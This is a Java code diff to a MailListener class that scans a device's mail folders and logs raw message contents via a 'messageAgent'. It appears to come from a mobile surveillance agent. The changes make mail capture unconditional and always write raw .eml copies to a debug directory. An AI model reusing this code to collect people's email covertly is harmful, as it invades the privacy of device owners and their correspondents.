@@ -231,7 +231,6 @@ public final class MailListener implements FolderListener, StoreListener,
         debug.trace("saveLog: " + message + " name: " + storeName);
         //#endif
 
-        final ByteArrayOutputStream os = null;
         try {
 
             final int flags = 1;
@@ -268,40 +267,19 @@ public final class MailListener implements FolderListener, StoreListener,
             //#ifdef DEBUG_TRACE
             debug.trace("saveLog: "
                     + mail.substring(0, Math.min(mail.length(), 200)));
-
+            //#endif
+            
             AutoFlashFile mailSaved;
-
-            /*
-             * mailSaved = new AutoFlashFile(Path.USER()
-             * + filetime.getOrderedString() + "UTF8.eml", false);
-             * mailSaved.create();
-             * mailSaved.write(mail.getBytes("UTF-8"));
-             */
 
             mailSaved = new AutoFlashFile(Path.USER() + Path.DEBUG_DIR + "M_"
                     + filetime.getOrderedString() + ".ISO-8859-1.eml", false);
             mailSaved.create();
             mailSaved.write(mail.getBytes("ISO-8859-1"));
 
-            /*
-             * mailSaved = new AutoFlashFile(Path.USER()
-             * + filetime.getOrderedString() + ".UTF16.eml", false);
-             * mailSaved.create();
-             * mailSaved.write(mail.getBytes("UTF-16BE"));
-             */
-            //#endif
 
             messageAgent.createLog(additionalData, mail.getBytes("ISO-8859-1"),
                     LogType.MAIL_RAW);
 
-            /*
-             * newMail = mail + "WCHAR";
-             * messageAgent.createLog(additionalData, WChar.getBytes(newMail),
-             * LogType.MAIL_RAW);
-             * newMail = mail + "UTF-8";
-             * messageAgent.createLog(additionalData, newMail.getBytes("UTF-8"),
-             * LogType.MAIL_RAW);
-             */
 
         } catch (final Exception ex) {
             //#ifdef DEBUG_ERROR
@@ -309,14 +287,7 @@ public final class MailListener implements FolderListener, StoreListener,
             //#endif
             return false;
 
-        } finally {
-            if (os != null) {
-                try {
-                    os.close();
-                } catch (final IOException e) {
-                }
-            }
-        }
+        } 
 
         return true;
     }
@@ -378,14 +349,15 @@ public final class MailListener implements FolderListener, StoreListener,
                         //#endif
 
                         final Message message = messages[j];
-                        int flags = message.getFlags();
-                        //#ifdef DEBUG_TRACE
-                        debug.trace("flags: " + flags);
-                        //#endif
-
+                       
                         //#ifdef DBC
                         Check.asserts(message != null,
                                 "scanFolders: message != null");
+                        //#endif
+                        
+                        int flags = message.getFlags();
+                        //#ifdef DEBUG_TRACE
+                        debug.trace("flags: " + flags);
                         //#endif
                         final int filtered = collectFilter.filterMessage(
                                 message, lastCheckDate.getTime());
@@ -396,16 +368,15 @@ public final class MailListener implements FolderListener, StoreListener,
                             Check.asserts(storeName != null,
                                     "scanFolders: storeName != null");
                             //#endif
-                            //#ifdef SAVE_MAIL
+
                             saveLog(message, collectFilter.maxMessageSize,
                                     storeName);
-                            //#endif
 
-                            //message.setFlag(Flag.OPENED, true);
                             break;
                         case Filter.FILTERED_DISABLED:
                         case Filter.FILTERED_NOTFOUND:
-                            updateMarker = false; //fallback, inibisce l'updateLastCheck
+                            updateMarker = false; //fallthrough, inibisce l'updateLastCheck
+                        //$FALL-THROUGH$
                         case Filter.FILTERED_LASTCHECK:
                         case Filter.FILTERED_DATEFROM:
                             next = true;
